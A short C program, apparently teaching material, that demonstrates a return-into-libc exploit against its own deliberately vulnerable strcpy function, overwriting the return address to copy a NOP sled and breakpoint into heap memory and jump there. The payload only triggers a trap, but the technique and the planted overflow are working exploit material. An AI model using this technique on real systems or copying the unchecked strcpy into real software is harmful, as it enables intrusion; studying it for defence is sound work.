/*
 * Sample code demonstrating return into libc attacks
 * effectively bypassing non-exec stack protection
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>

static unsigned char asmcode[] = {
   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
   "\xcc"
   "\x41\x42\x43\x44"
   "\x00"
};

void vuln(const char *s)
{
   char buf[256];

   strcpy(buf, s);
}

void trap_handler(int signo)
{
   printf("[+] Worked!\n");

   exit(EXIT_SUCCESS);
}

main()
{
   char buf[512];
   char *p;
   void *strcpy_ptr;
   void *heap_base;

   signal(SIGTRAP, trap_handler);

   strcpy_ptr = (void*) &strcpy;
   printf("[+] strcpy is at %p\n", (unsigned long)strcpy_ptr);

   heap_base = (void*) malloc(getpagesize());
   printf("[+] heap base is at %p\n", (unsigned long)heap_base);

   memset(buf, 0x00, sizeof(buf));
   memset(buf, 0x41, 256);
   p = buf + 256;
   *((unsigned long*)p) = 0x42424242;  /* EBP */
   p += 4;
   *((unsigned long*)p) = (unsigned long) strcpy_ptr;  /* EIP */
   p += 4;
   *((unsigned long*)p) = (unsigned long) heap_base;  /* RET */
   p += 4;
   *((unsigned long*)p) = (unsigned long) heap_base;  /* ARG1 */
   p += 4;
   *((unsigned long*)p) = (unsigned long) &asmcode;  /* ARG2 */

   vuln(buf);

   printf("[-] Failed\n");
   exit(EXIT_FAILURE);
}
